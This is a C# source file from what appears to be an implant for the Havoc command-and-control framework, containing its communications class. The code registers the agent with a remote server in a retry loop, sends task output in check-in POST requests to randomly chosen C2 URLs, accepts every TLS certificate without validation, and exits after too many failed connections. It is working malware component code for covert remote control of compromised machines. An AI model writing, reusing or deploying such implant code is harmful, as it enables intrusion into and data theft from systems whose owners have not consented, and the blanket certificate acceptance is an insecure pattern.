using System;
using System.Collections;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

namespace HavocImplant.Communications
{
    public class Comms
    {
        static Implant agent;
        static int timeoutCounter = 0;

        public static void Init(Implant implant)
        {
            agent = implant;
        }
        public static void Register()
        {
            string registrationRequestBody = Utils.obtainRegisterDict( Int32.Parse(Encoding.ASCII.GetString(agent.agentId)));
            byte[] agentHeader = Utils.createHeader(agent.magic, registrationRequestBody);

            string response = "";
            while (!response.Equals("registered"))
            {
                Console.WriteLine("Trying to register");
                response = Encoding.UTF8.GetString(SendReq(registrationRequestBody, agentHeader));
                Console.WriteLine("Response: {0}", response);
                Thread.Sleep(agent.sleepTime);
            }
            agent.registered = true;
        }
        public static byte[] CheckIn(Implant agent, string data, string checkInType)
        {
            string checkInRequestBody = "{\"task\": \"{1}\", \"data\": \"{0}\"}".Replace("{1}", checkInType).Replace("{0}", Regex.Replace(data, @"\r\n?|\n|\n\r", "\\n"));
            byte[] agentHeader = Utils.createHeader(agent.magic, checkInRequestBody);
            byte[] response = SendReq(checkInRequestBody, agentHeader);
            return response;
        }
        public static byte[] SendReq(string requestBody, byte[] agentHeader)
        {
            bool AcceptAllCertifications(object sender, System.Security.Cryptography.X509Certificates.X509Certificate certification, System.Security.Cryptography.X509Certificates.X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
            {
                return true;
            }
            Random rand = new Random();
            //string responseString = "";
            byte[] responseBytes = new byte[] { };
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;

            var request = (HttpWebRequest)WebRequest.Create(agent.url[rand.Next(0, agent.url.Length)]);

            ArrayList arrayList = new ArrayList();
            arrayList.AddRange(agentHeader);

            string postData = requestBody;
            byte[] postBytes = Encoding.UTF8.GetBytes(postData);
            arrayList.AddRange(postBytes);
            byte[] data = (byte[])arrayList.ToArray(typeof(byte));

            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            request.ContentLength = data.Length;
            request.Timeout = agent.timeout;
            try
            {
                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();

                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    using (var memoryStream = new MemoryStream())
                    {
                        response.GetResponseStream().CopyTo(memoryStream);
                        responseBytes = memoryStream.ToArray();
                    }
                }
                if (responseBytes.Length > 0)
                {
                    timeoutCounter = 0;
                }
                timeoutCounter = 0;
            }
            catch (WebException ex)
            {
                if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
                {
                    var response = (HttpWebResponse)ex.Response;
                    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        using (var memoryStream = new MemoryStream())
                        {
                            response.GetResponseStream().CopyTo(memoryStream);
                            responseBytes = memoryStream.ToArray();
                        }
                    }
                }
                if (ex.Status == WebExceptionStatus.Timeout || ex.Status == WebExceptionStatus.ConnectFailure)
                {
                    timeoutCounter += 1;
                    if (timeoutCounter == agent.maxTries) Environment.Exit(Environment.ExitCode);
                }
                Console.WriteLine($"status code: {ex.Status}");
            }

            return responseBytes;
        }
    }
}
